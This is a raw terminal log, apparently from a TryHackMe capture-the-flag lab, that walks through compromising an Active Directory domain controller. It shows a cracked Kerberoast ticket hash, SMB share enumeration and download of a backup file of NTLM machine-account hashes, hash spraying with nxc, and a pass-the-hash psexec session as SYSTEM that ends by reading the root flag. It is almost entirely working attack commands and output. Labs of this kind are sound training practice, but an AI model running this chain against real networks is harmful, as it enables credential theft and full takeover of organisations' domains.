+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$effb873954c88d4f9a9c2e0f31c9fd98$5eb9fdf9bd408efcd62f58df06d725d6b8e0e5bb5bd88692197fb0f5cfc2b28d50624367018bb08eb3f13bcd9591dddd9e2f98d4f8a540e91ec1384f4639e4a0e4bed86cac307139731281da80106b0cb435b8afb0a9668df6586a2215884a84de937debe5cedd8c564b19025cc1a6e22e53256c49571c1a4733e4d6fdfa3327d483d8e41a83d1d3251cc5cc8a1ff79b1d2b1efb3431da0e17fb2d02cf732c16a2391f38596ff5cd51b0e2030909adf3198eb648bc3e5eaba52b6e9630474337769c827a15fa1d72e85248407959dc93750ba9a06e17e9e4cee9e4492de3a44a1b6fcada3047074fad1e073c139e72ab21e0d95ae5301f637321b90f9624ea3246d219f61f166af81e65d8a3c2fdccdd7708404dd97e8079f781b67d18a895516a0e1679055e6109076115c970ba778e6bec80222c8cad8ee38a2b3a46bfe7f2b4f05f24d21b915eee998a9e5ca5f01c7ea25ebe17d1ac9771db3ee79038c0400117537fa3c50cfd81d73f398af326da882cc346e85400a0162d23477141153bc206ca8b81d1f742159f8f893a2f617b0fe2735dd172e4654b1977515fa7f48d7cf3c45e6711794cb96eacfbe9eeb578e38b15de6bf085d0b396a0b96498e09d78f5adcc539198d46304f05f118e031311d7f148a1a21f2401784da70ee3ff84111b5dca6f79203e0b7c5b1f281510bc1c2d17dd85c4074f368c8cbf50ccbfed83d2b6ad09d60c9d18d30c1f789caff3013ce571df6fa90e7132c5fc7f46215c8637d4fe5130e5b9a474e72002332b54d406ecd7d49fa07ad5f7c8159d02aeea8a1995dc53eea040510b67dbdd7dcd0292b679d5c927abb8201601680c44bd68421256220483b20fc2a7fd290871664d41ab215d2dbd465eafca5ed01ce9cb1df2f3c9a56614ed50e24c09fa50419d17c2a082507fe63aea22ed626e25b3ba5c71168fd77ee6416300eaedbca4890e23cc60ef83df4e3fcc0c4a220d9c003cd8de305d81d4ff3e6a1776da2e1aa3494c57202d1dd9a954e458e43e4fe24ed90394877608f898278a20d147b991243d7e0f0c40557590ad7d09e7e8347e92df030b3513716089272ae05706786babefdaf2ce486178bdb60a5ae283351f427d0c503668149cfa93fcb8b94e0e5f1c9a92e6028d8573fe4981a55a29ec5444c476e71f638be633e9e3ed58ab3b8692bfb1973ad9154056be8790127559f192cee0414e23b6f5280f72e95a0bb2642133ca9cc0de4f312dbd0e8afb1180ce26bb8c3f6d1cc9042a05db9ce6dc7d0cb2a300451f1c4cb37f5052c7b3b5c03301fed1decc7740cec54f7b2457f7b1044c00e15a33ae6d1489e8ce39b5721a0c05859ab0b65826f30d93478a3e2c1f2d80dd46c9197b43de1d395692d9a0d4ba8c93ea1ace67d4100813c49a6a0e3a355a3fcdb9bf5ea085cf92db02f0d5cbb7205a88eff9bb6bd196efd77f830153239294755c8baed85637bd0601759648ac4278d78f:Password123!!
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q
+
+Password123!!
+
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ nxc smb 10.10.158.163 -u 'file_svc' -p 'Password123!!' --shares              
+SMB         10.10.158.163   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.158.163   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
+SMB         10.10.158.163   445    DC01             [*] Enumerated shares
+SMB         10.10.158.163   445    DC01             Share           Permissions     Remark
+SMB         10.10.158.163   445    DC01             -----           -----------     ------
+SMB         10.10.158.163   445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.158.163   445    DC01             backup          READ            
+SMB         10.10.158.163   445    DC01             C$                              Default share
+SMB         10.10.158.163   445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.158.163   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.158.163   445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.158.163   445    DC01             Users                           
+
+└─$ smbclient //10.10.158.163/backup -U 'file_svc' -p 'Password123!!'
+Password for [WORKGROUP\file_svc]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jun 17 17:41:17 2024
+  ..                                 DR        0  Fri Jul 25 17:51:20 2025
+  backup_extract.txt                  A      892  Mon Jun 17 08:41:05 2024
+
+                12942591 blocks of size 4096. 10603531 blocks available
+smb: \> get backup_extract.txt
+getting file \backup_extract.txt of size 892 as backup_extract.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+smb: \> quit
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ cat backup_extract.txt  
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ cat backup_extract.txt  
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ cat extracted_users.txt                                       
+WebServer$
+DatabaseServer$
+CitrixServer$
+FileServer$
+MailServer$
+BackupServer$
+ApplicationServer$
+PrintServer$
+ProxyServer$
+MonitoringServer$
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ cat backup_extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > extracted_hashes.txt
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ ls
+backup_extract.txt    extracted_users.txt  nmap_scan          tickets.txt  user      users.txt
+extracted_hashes.txt  lookupsid_output     rockyou_clean.txt  top50.txt    user.txt
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ cat extracted_hashes.txt
+00000000000000000000000000000000:c47b45f5d4df5a494bd19f13e14f7902
+00000000000000000000000000000000:406b424c7b483a42458bf6f545c936f7
+00000000000000000000000000000000:48fc7eca9af236d7849273990f6c5117
+00000000000000000000000000000000:e41da7e79a4c76dbd9cf79d1cb325559
+00000000000000000000000000000000:46a4655f18def136b3bfab7b0b4e70e3
+00000000000000000000000000000000:46a4655f18def136b3bfab7b0b4e70e3
+00000000000000000000000000000000:8cd90ac6cba6dde9d8038b068c17e9f5
+00000000000000000000000000000000:b8a38c432ac59ed00b2a373f4f050d28
+00000000000000000000000000000000:4e3f0bb3e5b6e3e662611b1a87988881
+00000000000000000000000000000000:48fc7eca9af236d7849273990f6c5117
+                                                                                                                    
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ nxc smb 10.10.158.163 -u extracted_users.txt  -H extracted_hashes.txt --no-bruteforce
+SMB         10.10.158.163   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.158.163   445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE
+SMB         10.10.158.163   445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
+SMB         10.10.158.163   445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
+SMB         10.10.158.163   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+
+┌──(alvan㉿vbox)-[~/THM/soupdecode01]
+└─$ impacket-psexec 'FileServer$'@10.10.158.163 -hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.158.163.....
+[*] Found writable share ADMIN$
+[*] Uploading file oNwqLrAm.exe
+[*] Opening SVCManager on 10.10.158.163.....
+[*] Creating service jZDT on 10.10.158.163.....
+[*] Starting service jZDT.....
+[!] Press help for extra shell commands
+helpMicrosoft Windows [Version 10.0.20348.587]
+
+
+ lcd {path}                 - changes the current local directory to {path}
+ exit                       - terminates the server process (and this session)
+ lput {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (ADMIN$)
+ lget {file}                 - downloads pathname RELATIVE to the connected share (ADMIN$) to the current local dir
+ ! {cmd}                    - executes a local shell cmd
+
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+C:\Windows\system32> cd ../..
+ 
+C:\> ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+ 
+C:\> dir
+ Volume in drive C has no label.
+ Volume Serial Number is CCB5-C4FB
+
+ Directory of C:\
+
+05/08/2021  01:15 AM    <DIR>          PerfLogs
+06/15/2024  10:54 AM    <DIR>          Program Files
+05/08/2021  02:34 AM    <DIR>          Program Files (x86)
+07/04/2024  03:48 PM    <DIR>          Users
+08/05/2025  01:51 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  43,434,762,240 bytes free
+
+C:\> cd Users
+ 
+C:\Users> dir
+ Volume in drive C has no label.
+ Volume Serial Number is CCB5-C4FB
+
+ Directory of C:\Users
+
+07/04/2024  03:48 PM    <DIR>          .
+07/04/2024  03:49 PM    <DIR>          admin
+08/05/2025  01:28 PM    <DIR>          Administrator
+06/15/2024  10:54 AM    <DIR>          Public
+06/17/2024  10:24 AM    <DIR>          ybob317
+               0 File(s)              0 bytes
+               5 Dir(s)  43,434,754,048 bytes free
+
+C:\Users> cd Administrator/Desktop
+ 
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is CCB5-C4FB
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/25/2025  10:51 AM    <DIR>          .
+08/05/2025  01:28 PM    <DIR>          ..
+06/17/2024  10:41 AM    <DIR>          backup
+07/25/2025  10:51 AM                33 root.txt
+               1 File(s)             33 bytes
+               3 Dir(s)  43,434,754,048 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt
+27cb2be302c
+
+                                                                                                                    
+ 
